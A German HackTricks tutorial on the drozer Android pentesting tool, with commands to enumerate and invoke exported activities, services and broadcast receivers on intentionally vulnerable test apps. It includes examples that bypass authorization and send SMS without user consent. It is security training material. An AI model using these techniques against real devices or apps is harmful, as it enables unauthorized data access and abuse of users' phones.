# Drozer Anleitung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug-Bounty-Tipp**: **Melden Sie sich an** f√ºr **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute bei unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) und beginnen Sie, Pr√§mien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## APKs zum Testen

* [Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk) (von mrwlabs)
* [DIVA](https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz)

**Teile dieses Tutorials wurden aus dem** [**Drozer-Dokumentations-PDF**](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)** extrahiert.**

## Installation

Installieren Sie den Drozer-Client auf Ihrem Host. Laden Sie ihn von den [neuesten Versionen](https://github.com/mwrlabs/drozer/releases) herunter.
```bash
pip install drozer-2.4.4-py2-none-any.whl
pip install twisted
pip install service_identity
```
Lade die drozer APK von den [neuesten Ver√∂ffentlichungen](https://github.com/mwrlabs/drozer/releases) herunter und installiere sie. Im Moment ist es [diese](https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk).
```bash
adb install drozer.apk
```
### Starten des Servers

Der Agent l√§uft auf Port 31415, wir m√ºssen [Port-Weiterleitung](https://de.wikipedia.org/wiki/Portweiterleitung) durchf√ºhren, um die Kommunikation zwischen dem Drozer-Client und dem Agent herzustellen. Hier ist der Befehl dazu:
```bash
adb forward tcp:31415 tcp:31415
```
Schlie√ülich starten Sie die Anwendung und dr√ºcken Sie unten auf "**ON**"

![](<../../../.gitbook/assets/image (459).png>)

Und verbinden Sie sich damit:
```bash
drozer console connect
```
## Interessante Befehle

| **Befehle**     | **Beschreibung**                                                                                                                                      |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Help MODULE** | Zeigt die Hilfe des ausgew√§hlten Moduls an                                                                                                             |
| **list**        | Zeigt eine Liste aller drozer Module, die in der aktuellen Sitzung ausgef√ºhrt werden k√∂nnen. Dies verbirgt Module, f√ºr die Sie nicht die entsprechenden Berechtigungen haben. |
| **shell**       | Startet eine interaktive Linux-Shell auf dem Ger√§t im Kontext des Agents.                                                                              |
| **clean**       | Entfernt tempor√§re Dateien, die von drozer auf dem Android-Ger√§t gespeichert wurden.                                                                   |
| **load**        | L√§dt eine Datei mit drozer-Befehlen und f√ºhrt sie in Sequenz aus.                                                                                       |
| **module**      | Sucht und installiert zus√§tzliche drozer-Module aus dem Internet.                                                                                       |
| **unset**       | Entfernt eine benannte Variable, die drozer an alle von ihm gestarteten Linux-Shells √ºbergibt.                                                          |
| **set**         | Speichert einen Wert in einer Variablen, der als Umgebungsvariable an alle von drozer gestarteten Linux-Shells √ºbergeben wird.                         |
| **shell**       | Startet eine interaktive Linux-Shell auf dem Ger√§t im Kontext des Agents.                                                                              |
| **run MODULE**  | F√ºhrt ein drozer-Modul aus                                                                                                                             |
| **exploit**     | Drozer kann Exploits erstellen, die auf dem Ger√§t ausgef√ºhrt werden sollen. `drozer exploit list`                                                      |
| **payload**     | Die Exploits ben√∂tigen ein Payload. `drozer payload list`                                                                                               |

### Paket

Finde den **Namen** des Pakets, indem du nach einem Teil des Namens filterst:
```bash
dz> run app.package.list -f sieve
com.mwr.example.sieve
```
**Grundlegende Informationen** zum Paket:
```bash
dz> run app.package.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Process Name: com.mwr.example.sieve
Version: 1.0
Data Directory: /data/data/com.mwr.example.sieve
APK Path: /data/app/com.mwr.example.sieve-2.apk
UID: 10056
GID: [1028, 1015, 3003]
Shared Libraries: null
Shared User ID: null
Uses Permissions:
- android.permission.READ_EXTERNAL_STORAGE
- android.permission.WRITE_EXTERNAL_STORAGE
- android.permission.INTERNET
Defines Permissions:
- com.mwr.example.sieve.READ_KEYS
- com.mwr.example.sieve.WRITE_KEYS
```
Lesen Sie **Manifest**:
```bash
run app.package.manifest jakhar.aseem.diva
```
**Angriffsfl√§che** des Pakets:
```bash
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
3 activities exported
0 broadcast receivers exported
2 content providers exported
2 services exported
is debuggable
```
* **Aktivit√§ten**: M√∂glicherweise k√∂nnen Sie eine Aktivit√§t starten und eine Art Autorisierung umgehen, die Sie daran hindern sollte, sie zu starten.
* **Inhaltsanbieter**: M√∂glicherweise k√∂nnen Sie auf private Daten zugreifen oder eine Schwachstelle ausnutzen (SQL-Injection oder Pfadtraversierung).
* **Dienste**:
* **is debuggable**: [Weitere Informationen](./#is-debuggeable)

### Aktivit√§ten

Der Wert "android:exported" eines exportierten Aktivit√§tskomponenten ist in der AndroidManifest.xml-Datei auf **"true"** gesetzt:
```markup
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>
```
**Auflisten exportierter Aktivit√§ten**:
```bash
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.FileSelectActivity
com.mwr.example.sieve.MainLoginActivity
com.mwr.example.sieve.PWList
```
**Aktivit√§t starten**:

M√∂glicherweise k√∂nnen Sie eine Aktivit√§t starten und eine Art Autorisierung umgehen, die Sie daran hindern sollte, sie zu starten.

{% code overflow="wrap" %}
```bash
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```
{% endcode %}

Sie k√∂nnen auch eine exportierte Aktivit√§t von **adb** aus starten:

* PackageName ist com.example.demo
* Exportierter ActivityName ist com.example.test.MainActivity
```bash
adb shell am start -n com.example.demo/com.example.test.MainActivity
```
### Inhaltanbieter

Dieser Beitrag war zu gro√ü, um hier zu sein, also **k√∂nnen Sie** [**darauf auf seiner eigenen Seite zugreifen**](exploiting-content-providers.md).

### Dienste

Ein exportierter Dienst wird in der Manifest.xml deklariert:

{% code overflow="wrap" %}
```markup
<service android:name=".AuthService" android:exported="true" android:process=":remote"/>
```
{% endcode %}

Im Code nach der \*\*`handleMessage`\*\* Funktion suchen, die die **Nachricht** **empfangen** wird:

![](<../../../.gitbook/assets/image (82).png>)

#### Dienst auflisten
```bash
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
com.mwr.example.sieve.AuthService
Permission: null
com.mwr.example.sieve.CryptoService
Permission: null
```
#### **Mit einem Dienst interagieren**
```bash
app.service.send            Send a Message to a service, and display the reply
app.service.start           Start Service
app.service.stop            Stop Service
```
#### Beispiel

Werfen Sie einen Blick auf die **drozer** Hilfe f√ºr `app.service.send`:

![](<../../../.gitbook/assets/image (1079).png>)

Beachten Sie, dass Sie zuerst die Daten innerhalb von "_msg.what_", dann "_msg.arg1_" und "_msg.arg2_" senden werden. Sie sollten im Code √ºberpr√ºfen, **welche Informationen verwendet werden** und wo.\
Mit der Option `--extra` k√∂nnen Sie etwas senden, das von "_msg.replyTo"_ interpretiert wird, und mit `--bundle-as-obj` erstellen Sie ein Objekt mit den bereitgestellten Details.

Im folgenden Beispiel:

* `what == 2354`
* `arg1 == 9234`
* `arg2 == 1`
* `replyTo == object(string com.mwr.example.sieve.PIN 1337)`
```bash
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 2354 9234 1 --extra string com.mwr.example.sieve.PIN 1337 --bundle-as-obj
```
![](<../../../.gitbook/assets/image (647).png>)

### Broadcast Receiver

**Im Abschnitt Grundlegende Informationen zu Android k√∂nnen Sie sehen, was ein Broadcast-Empf√§nger ist**.

Nachdem Sie diese Broadcast-Empf√§nger entdeckt haben, sollten Sie **den Code** von ihnen √ºberpr√ºfen. Achten Sie besonders auf die Funktion **`onReceive`**, da sie die empfangenen Nachrichten verarbeitet.

#### **Alle** Broadcast-Empf√§nger erkennen
```bash
run app.broadcast.info #Detects all
```
#### √úberpr√ºfen Sie die Broadcast-Empf√§nger einer App
```bash
#Check one negative
run app.broadcast.info -a jakhar.aseem.diva
Package: jakhar.aseem.diva
No matching receivers.

# Check one positive
run app.broadcast.info -a com.google.android.youtube
Package: com.google.android.youtube
com.google.android.libraries.youtube.player.PlayerUiModule$LegacyMediaButtonIntentReceiver
Permission: null
com.google.android.apps.youtube.app.common.notification.GcmBroadcastReceiver
Permission: com.google.android.c2dm.permission.SEND
com.google.android.apps.youtube.app.PackageReplacedReceiver
Permission: null
com.google.android.libraries.youtube.account.AccountsChangedReceiver
Permission: null
com.google.android.apps.youtube.app.application.system.LocaleUpdatedReceiver
Permission: null
```
#### Broadcast **Interaktionen**
```bash
app.broadcast.info          Get information about broadcast receivers
app.broadcast.send          Send broadcast using an intent
app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
```
#### Nachricht senden

In diesem Beispiel, bei dem der [FourGoats apk](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk) Content Provider missbraucht wird, k√∂nnen Sie **eine beliebige SMS** an ein nicht-premium Ziel **ohne die Erlaubnis des Benutzers** senden.

![](<../../../.gitbook/assets/image (415).png>)

![](<../../../.gitbook/assets/image (573).png>)

Wenn Sie den Code lesen, m√ºssen die Parameter "_phoneNumber_" und "_message_" an den Content Provider gesendet werden.
```bash
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"
```
### Ist debugf√§hig

Eine Produktions-APK sollte niemals debugf√§hig sein.\
Das bedeutet, dass Sie **einen Java-Debugger an die laufende Anwendung anh√§ngen**, sie zur Laufzeit inspizieren, Haltepunkte setzen, schrittweise vorgehen, Variablenwerte sammeln und sie sogar √§ndern k√∂nnen. [InfoSec Institute hat einen ausgezeichneten Artikel](../exploiting-a-debuggeable-applciation.md) √ºber das tiefergehende Eindringen, wenn Ihre Anwendung debugf√§hig ist und das Einschleusen von Code zur Laufzeit.

Wenn eine Anwendung debugf√§hig ist, wird sie im Manifest angezeigt:
```xml
<application theme="@2131296387" debuggable="true"
```
Du kannst alle debuggbaren Anwendungen mit **Drozer** finden:
```bash
run app.package.debuggable
```
## Tutorials

* [https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref](https://resources.infosecinstitute.com/android-penetration-tools-walkthrough-series-drozer/#gref)
* [https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md](https://github.com/mgcfish/mobiletools/blob/master/\_posts/2016-08-01-Using-Drozer-for-application-security-assessments.md)
* [https://www.hackingarticles.in/android-penetration-testing-drozer/](https://www.hackingarticles.in/android-penetration-testing-drozer/)
* [https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac](https://medium.com/@ashrafrizvi3006/how-to-test-android-application-security-using-drozer-edc002c5dcac)

## Weitere Informationen

* [https://blog.dixitaditya.com/android-pentesting-cheatsheet/](https://blog.dixitaditya.com/android-pentesting-cheatsheet/)

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug-Bounty-Tipp**: **Registrieren** Sie sich bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie, Pr√§mien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>
